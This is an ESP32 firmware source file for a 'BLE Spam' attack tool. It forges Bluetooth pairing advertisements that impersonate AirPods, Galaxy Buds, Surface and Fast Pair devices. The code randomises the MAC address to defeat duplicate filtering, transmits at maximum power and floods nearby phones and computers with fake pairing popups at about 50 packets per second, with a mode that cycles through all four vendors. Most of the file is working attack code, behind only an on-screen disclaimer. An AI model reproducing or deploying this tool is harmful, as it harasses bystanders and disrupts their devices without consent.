#include "BLESpam.h"
#include "DisplayTFT.h"
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <esp_bt.h>
#include <esp_gap_ble_api.h>
#include "Input.h"
#include "PepeDraw.h"
#include "Pins.h"
#include "SoundUtils.h"

extern DisplayTFT tft;

// ═══════════════════════════════════════════════════════════════════════════
//  TIPOS DE ATAQUE
// ═══════════════════════════════════════════════════════════════════════════
enum SpamMode {
    SPAM_APPLE     = 0,
    SPAM_SAMSUNG   = 1,
    SPAM_MICROSOFT = 2,
    SPAM_GOOGLE    = 3,
    SPAM_CHAOS     = 4
};

static const char* MODE_NAMES[] = {
    "Apple (iOS popups)",
    "Samsung (Android)",
    "Microsoft Swift Pair",
    "Google Fast Pair",
    "CHAOS MODE (all)"
};
static const int MODE_COUNT = 5;

// ═══════════════════════════════════════════════════════════════════════════
//  APPLE CONTINUITY · modelos de producto y sus nombres legibles
//  Format: sub-type 0x07 (pairing) + length + flags + product_id (2B) + etc
// ═══════════════════════════════════════════════════════════════════════════
struct AppleModel {
    uint8_t     product[2];
    const char* name;
};

static const AppleModel APPLE_MODELS[] = {
    {{0x0E, 0x20}, "AirPods Pro"},
    {{0x0A, 0x20}, "AirPods"},
    {{0x0B, 0x20}, "AirPods Max"},
    {{0x05, 0x20}, "AirPods 2nd gen"},
    {{0x13, 0x20}, "AirPods 3rd gen"},
    {{0x14, 0x20}, "AirPods Pro 2nd"},
    {{0x01, 0x20}, "AirPods 1st gen"},
    {{0x06, 0x20}, "Beats Solo 3"},
    {{0x09, 0x20}, "BeatsX"},
    {{0x0C, 0x20}, "Beats Flex"},
    {{0x11, 0x20}, "Beats Studio Pro"},
    {{0x16, 0x20}, "Powerbeats Pro"},
    {{0x17, 0x20}, "Beats Fit Pro"}
};
static const int APPLE_COUNT = sizeof(APPLE_MODELS) / sizeof(AppleModel);

// ═══════════════════════════════════════════════════════════════════════════
//  SAMSUNG EASY SETUP · Galaxy Buds series
// ═══════════════════════════════════════════════════════════════════════════
struct SamsungModel {
    uint8_t     id[2];
    const char* name;
};

static const SamsungModel SAMSUNG_MODELS[] = {
    {{0x83, 0xE0}, "Galaxy Buds Live"},
    {{0x80, 0xE0}, "Galaxy Buds+"},
    {{0x2C, 0xE1}, "Galaxy Buds 2"},
    {{0x40, 0xE1}, "Galaxy Buds 2 Pro"},
    {{0x05, 0xE1}, "Galaxy Buds Pro"},
    {{0x1F, 0xE0}, "Galaxy Buds"},
    {{0xA3, 0xE1}, "Galaxy Buds FE"}
};
static const int SAMSUNG_COUNT = sizeof(SAMSUNG_MODELS) / sizeof(SamsungModel);

// ═══════════════════════════════════════════════════════════════════════════
//  MICROSOFT SWIFT PAIR
// ═══════════════════════════════════════════════════════════════════════════
static const char* MS_NAMES[] = {
    "Surface Keyboard",
    "Surface Mouse",
    "Surface Headphones",
    "Xbox Controller",
    "Surface Pen"
};
static const int MS_COUNT = sizeof(MS_NAMES) / sizeof(char*);

// ═══════════════════════════════════════════════════════════════════════════
//  GOOGLE FAST PAIR · service data format
// ═══════════════════════════════════════════════════════════════════════════
struct GoogleModel {
    uint8_t     id[3];
    const char* name;
};

static const GoogleModel GOOGLE_MODELS[] = {
    {{0xCD, 0x82, 0x56}, "Pixel Buds"},
    {{0x00, 0x00, 0x47}, "Pixel Buds A"},
    {{0xF5, 0x2E, 0x41}, "Bose NC 700"},
    {{0x0E, 0x0B, 0x09}, "JBL Live 650"},
    {{0x14, 0x00, 0x45}, "Sony WH-1000XM4"},
    {{0x00, 0x00, 0x44}, "Nest Device"}
};
static const int GOOGLE_COUNT = sizeof(GOOGLE_MODELS) / sizeof(GoogleModel);

// ═══════════════════════════════════════════════════════════════════════════
//  ESTADO
// ═══════════════════════════════════════════════════════════════════════════
static volatile unsigned long packetsSent = 0;
static String  currentDeviceName = "";
static SpamMode activeMode = SPAM_APPLE;

static void prepareBleSpamDisplay() {
    pinMode(TFT_CS_PIN, OUTPUT);
    pinMode(NRF1_CSN_PIN, OUTPUT);
    pinMode(NRF2_CSN_PIN, OUTPUT);
    pinMode(NRF1_CE_PIN, OUTPUT);
    pinMode(NRF2_CE_PIN, OUTPUT);

    digitalWrite(NRF1_CE_PIN, LOW);
    digitalWrite(NRF2_CE_PIN, LOW);
    digitalWrite(NRF1_CSN_PIN, HIGH);
    digitalWrite(NRF2_CSN_PIN, HIGH);
    digitalWrite(TFT_CS_PIN, HIGH);
    delayMicroseconds(80);
}

static void clearBleSpamScreen() {
    prepareBleSpamDisplay();
    tft.fillScreen(TFT_BLACK);
    delay(12);
    tft.fillRect(0, 0, 320, 240, TFT_BLACK);
}

// ═══════════════════════════════════════════════════════════════════════════
//  GENERACIÓN DE MAC ALEATORIA (evita que los dispositivos "recuerden" la MAC
//  y filtren los advertisements repetidos)
// ═══════════════════════════════════════════════════════════════════════════
static void randomizeMac() {
    esp_bd_addr_t mac;
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)random(0, 256);
    // Los 2 bits superiores del primer byte marcan tipo Random Static
    mac[0] |= 0xC0;
    esp_ble_gap_set_rand_addr(mac);
}

// ═══════════════════════════════════════════════════════════════════════════
//  EMISIÓN DE UN PAQUETE (genera advertisement según el modo)
// ═══════════════════════════════════════════════════════════════════════════
static void sendApplePacket(BLEAdvertising* adv) {
    int idx = random(0, APPLE_COUNT);
    const AppleModel& m = APPLE_MODELS[idx];
    currentDeviceName = String(m.name);

    // Apple Continuity pairing packet:
    //  1E FF 4C 00 07 19 01 [PRODUCT_ID 2B] 55 [padding]
    uint8_t packet[31] = {
        0x1E, 0xFF,             // len, type=Mfg Data
        0x4C, 0x00,             // Apple vendor ID
        0x07, 0x19,             // Continuity - pairing sub-type, length
        0x01,                   // flags
        m.product[0], m.product[1],
        0x55
    };
    // Rellenar con random
    for (int i = 10; i < 31; i++) packet[i] = (uint8_t)random(0, 256);

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, sizeof(packet)));
    adv->setAdvertisementData(advData);
}

static void sendSamsungPacket(BLEAdvertising* adv) {
    int idx = random(0, SAMSUNG_COUNT);
    const SamsungModel& m = SAMSUNG_MODELS[idx];
    currentDeviceName = String(m.name);

    // Samsung Easy Setup packet (simplificado, funcional con One UI)
    uint8_t packet[27] = {
        0x1B, 0xFF,             // len, type=Mfg Data
        0x75, 0x00,             // Samsung vendor ID
        0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03,
        0x21, 0x01, 0x09,
        m.id[0], m.id[1],       // model ID
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
    };

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, sizeof(packet)));
    adv->setAdvertisementData(advData);
}

static void sendMicrosoftPacket(BLEAdvertising* adv) {
    int idx = random(0, MS_COUNT);
    currentDeviceName = String(MS_NAMES[idx]);

    // Microsoft Swift Pair packet
    // Flags + Mfg Data(0x06 Microsoft) + Swift Pair payload + device name
    uint8_t nameLen = strlen(MS_NAMES[idx]);
    if (nameLen > 20) nameLen = 20;

    uint8_t packet[31];
    int p = 0;
    packet[p++] = 0x03;       // flags len
    packet[p++] = 0x03;       // flags complete list
    packet[p++] = 0x2C; packet[p++] = 0xFE;  // placeholder service uuid
    packet[p++] = 0x06 + nameLen;  // mfg data length
    packet[p++] = 0xFF;       // type=Mfg Data
    packet[p++] = 0x06; packet[p++] = 0x00;  // MS vendor ID
    packet[p++] = 0x03;       // Swift Pair
    packet[p++] = 0x00;
    packet[p++] = 0x80;       // flags
    memcpy(&packet[p], MS_NAMES[idx], nameLen);
    p += nameLen;

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, p));
    adv->setAdvertisementData(advData);
}

static void sendGooglePacket(BLEAdvertising* adv) {
    int idx = random(0, GOOGLE_COUNT);
    const GoogleModel& m = GOOGLE_MODELS[idx];
    currentDeviceName = String(m.name);

    // Google Fast Pair service data (UUID 0xFE2C)
    uint8_t packet[14] = {
        0x02, 0x01, 0x06,             // flags
        0x03, 0x03, 0x2C, 0xFE,       // service UUID 0xFE2C (Fast Pair)
        0x06, 0x16, 0x2C, 0xFE,       // service data header
        m.id[0], m.id[1], m.id[2]     // model ID
    };

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, sizeof(packet)));
    adv->setAdvertisementData(advData);
}

// Dispatcher que emite un paquete según el modo (para CHAOS rota aleatorio)
static void sendSpamPacket(BLEAdvertising* adv, SpamMode mode) {
    SpamMode effective = mode;
    if (mode == SPAM_CHAOS) {
        effective = (SpamMode)random(0, 4);  // sortea entre los 4 reales
    }

    randomizeMac();

    switch (effective) {
        case SPAM_APPLE:     sendApplePacket(adv);     break;
        case SPAM_SAMSUNG:   sendSamsungPacket(adv);   break;
        case SPAM_MICROSOFT: sendMicrosoftPacket(adv); break;
        case SPAM_GOOGLE:    sendGooglePacket(adv);    break;
        default: break;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  DISCLAIMER INICIAL
// ═══════════════════════════════════════════════════════════════════════════
static bool showDisclaimer() {
    clearBleSpamScreen();
    tft.drawRect(0, 0, 320, 240, UI_MAIN);

    drawStringBig(35, 12, "WARNING!", UI_SELECT, 2);
    tft.drawFastHLine(0, 50, 320, UI_SELECT);

    int y = 62;
    drawStringCustom(10, y,     "This tool sends fake BLE",            UI_MAIN, 1);
    y += 12;
    drawStringCustom(10, y,     "advertisements to trigger",            UI_MAIN, 1);
    y += 12;
    drawStringCustom(10, y,     "pairing popups on nearby devices.",    UI_MAIN, 1);
    y += 20;

    drawStringCustom(10, y,     "- Do NOT use in hospitals,",           UI_ACCENT, 1);
    y += 12;
    drawStringCustom(10, y,     "  aircraft or public transit.",        UI_ACCENT, 1);
    y += 12;
    drawStringCustom(10, y,     "- May be illegal in some regions.",    UI_ACCENT, 1);
    y += 12;
    drawStringCustom(10, y,     "- Educational / demo purposes only.",  UI_ACCENT, 1);
    y += 20;

    drawStringCustom(10, y,     "You are responsible for your use.",    UI_MAIN, 1);

    tft.drawFastHLine(0, 210, 320, UI_MAIN);
    drawStringCustom(10, 218,   "OK: ACCEPT   BACK/UP/DN: CANCEL",      UI_ACCENT, 1);

    // Esperar respuesta
    while (true) {
        if (isEnterPressed()) {
            beep(2200, 60);
            while (isEnterPressed()) delay(5);
            flushNavInput(80);
            return true;
        }
        if (isBackPressed() || digitalRead(BTN_UP) == LOW ||
            digitalRead(BTN_DOWN) == LOW) {
            beep(1000, 80);
            while (isBackPressed() || digitalRead(BTN_UP) == LOW ||
                   digitalRead(BTN_DOWN) == LOW) delay(5);
            flushNavInput(80);
            return false;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  MENÚ DE SELECCIÓN DE MODO
// ═══════════════════════════════════════════════════════════════════════════
static void drawModeMenu(int cursor) {
    clearBleSpamScreen();
    tft.drawRect(0, 0, 320, 240, UI_MAIN);

    drawStringBig(10, 8, "BLE SPAM", UI_MAIN, 1);
    tft.drawFastHLine(0, 30, 320, UI_ACCENT);

    // Lista
    for (int i = 0; i < MODE_COUNT; i++) {
        int y = 42 + i * 24;
        bool selected = (i == cursor);

        if (selected) tft.fillRect(5, y - 2, 310, 20, UI_SELECT);
        uint16_t fg = selected ? UI_BG : UI_MAIN;
        drawStringCustom(15, y + 2, MODE_NAMES[i], fg, 2);
    }

    // Footer
    tft.drawFastHLine(0, 215, 320, UI_ACCENT);
    drawStringCustom(10, 222, "OK:START   BACK/OK(H):BACK", UI_ACCENT, 1);
}

// Devuelve -1 si el usuario cancela; si no, el modo elegido (0..4)
static int selectMode() {
    int cursor = 0;
    drawModeMenu(cursor);

    while (true) {
        if (isBackPressed()) {
            beep(1000, 50);
            while (isBackPressed()) delay(5);
            flushNavInput(80);
            return -1;
        }
        if (digitalRead(BTN_UP) == LOW) {
            cursor = (cursor - 1 + MODE_COUNT) % MODE_COUNT;
            beep(2100, 20);
            drawModeMenu(cursor);
            delay(180);
        }
        if (digitalRead(BTN_DOWN) == LOW) {
            cursor = (cursor + 1) % MODE_COUNT;
            beep(2100, 20);
            drawModeMenu(cursor);
            delay(180);
        }
        if (isEnterPressed()) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 50);
            flushNavInput(80);
            if (held) return -1;
            return cursor;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  PANTALLA DE ATAQUE ACTIVO
// ═══════════════════════════════════════════════════════════════════════════
static void drawAttackFrame(SpamMode mode) {
    clearBleSpamScreen();
    tft.drawRect(0, 0, 320, 240, UI_SELECT);   // borde naranja = activo
    tft.drawRect(1, 1, 318, 238, UI_SELECT);

    // Header con título del modo
    String title = "SPAM: ";
    switch (mode) {
        case SPAM_APPLE:     title += "APPLE";       break;
        case SPAM_SAMSUNG:   title += "SAMSUNG";     break;
        case SPAM_MICROSOFT: title += "MICROSOFT";   break;
        case SPAM_GOOGLE:    title += "GOOGLE";      break;
        case SPAM_CHAOS:     title += "CHAOS";       break;
    }

    drawStringBig(10, 12, title, UI_SELECT, 1);
    drawStringCustom(225, 18, "[ACTIVE]", TFT_GREEN, 1);
    tft.drawFastHLine(0, 38, 320, UI_SELECT);

    // Labels estáticos
    drawStringCustom(15, 70,  "Packets sent:", UI_ACCENT, 1);
    drawStringCustom(15, 100, "Current:",      UI_ACCENT, 1);
    drawStringCustom(15, 130, "Rate:",         UI_ACCENT, 1);

    // Footer
    tft.drawFastHLine(0, 210, 320, UI_SELECT);
    drawStringCustom(10, 220, "BACK / OK(HOLD): STOP", TFT_RED, 1);
}

static void drawAttackStats(unsigned long pkts, float rate) {
    // Limpiar valores anteriores
    tft.fillRect(130, 65, 185, 14, TFT_BLACK);
    tft.fillRect(130, 95, 185, 14, TFT_BLACK);
    tft.fillRect(130, 125, 185, 14, TFT_BLACK);

    // Packets sent
    drawStringCustom(130, 70, String(pkts), TFT_GREEN, 2);

    // Current device
    String cd = currentDeviceName;
    drawStringFit(130, 100, cd, TFT_YELLOW, 180, 1);

    // Rate
    char rateBuf[24];
    snprintf(rateBuf, sizeof(rateBuf), "%d pkt/sec", (int)rate);
    drawStringCustom(130, 130, rateBuf, TFT_CYAN, 1);

    // Barra de animación de actividad
    tft.fillRect(10, 160, 300, 14, TFT_BLACK);
    tft.drawRect(10, 160, 300, 14, UI_ACCENT);
    int fillW = 10 + (int)(random(50, 290));
    tft.fillRect(12, 162, fillW - 12, 10, UI_SELECT);
}

// ═══════════════════════════════════════════════════════════════════════════
//  MAIN
// ═══════════════════════════════════════════════════════════════════════════
void runBLESpam() {

    // Esperar liberación de OK
    while (isEnterPressed() || isBackPressed()) delay(5);
    flushNavInput(100);
    prepareBleSpamDisplay();

    // Disclaimer
    if (!showDisclaimer()) {
        clearBleSpamScreen();
        // Usuario canceló
        return;
    }

    // Loop de menú (se puede entrar/salir de varios modos sin reiniciar BLE)
    while (true) {
        int choice = selectMode();
        if (choice < 0) break;   // BACK

        activeMode = (SpamMode)choice;

        // ── Inicializar BLE para TX ────────────────────────────────────
        BLEDevice::init("");
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
        BLEServer*      server = BLEDevice::createServer();
        BLEAdvertising* adv    = server->getAdvertising();

        // Parámetros de advertising
        adv->setMinInterval(0x20);   // 20 ms
        adv->setMaxInterval(0x40);   // 40 ms

        // ── Pantalla de ataque ──────────────────────────────────────────
        drawAttackFrame(activeMode);
        beep(2400, 40); delay(20);
        beep(3000, 60);

        packetsSent = 0;
        unsigned long startMs = millis();
        unsigned long lastStatsUpdate = millis();
        unsigned long lastPacket = 0;
        unsigned long lastPktCount = 0;
        float currentRate = 0;

        bool stopAttack = false;
        unsigned long okPressStart = 0;
        bool okHeld = false;

        while (!stopAttack) {
            // Emitir paquete cada ~20 ms (≈50 pkt/sec)
            if (millis() - lastPacket > 20) {
                adv->stop();
                sendSpamPacket(adv, activeMode);
                adv->start();
                packetsSent++;
                lastPacket = millis();
            }

            // Update stats UI cada 250 ms
            if (millis() - lastStatsUpdate > 250) {
                unsigned long elapsed = millis() - lastStatsUpdate;
                unsigned long delta = packetsSent - lastPktCount;
                currentRate = (delta * 1000.0f) / elapsed;
                lastPktCount = packetsSent;
                drawAttackStats(packetsSent, currentRate);
                lastStatsUpdate = millis();
            }

            // BACK o OK HOLD para parar
            if (isBackPressed()) {
                stopAttack = true;
                while (isBackPressed()) delay(5);
                flushNavInput(80);
            } else if (isEnterPressed()) {
                if (!okHeld) {
                    okPressStart = millis();
                    okHeld = true;
                } else if (millis() - okPressStart > 500) {
                    stopAttack = true;
                }
            } else {
                okHeld = false;
            }

            delay(5);
        }

        // ── Parar BLE ───────────────────────────────────────────────────
        adv->stop();
        BLEDevice::deinit(false);

        beep(1800, 40); delay(20);
        beep(1200, 60);

        // Esperar liberación OK
        while (isEnterPressed() || isBackPressed()) delay(5);
        clearBleSpamScreen();
        flushNavInput(120);

        // Volver al menú de selección de modo (loop)
    }

    // Sale al submenú padre
}
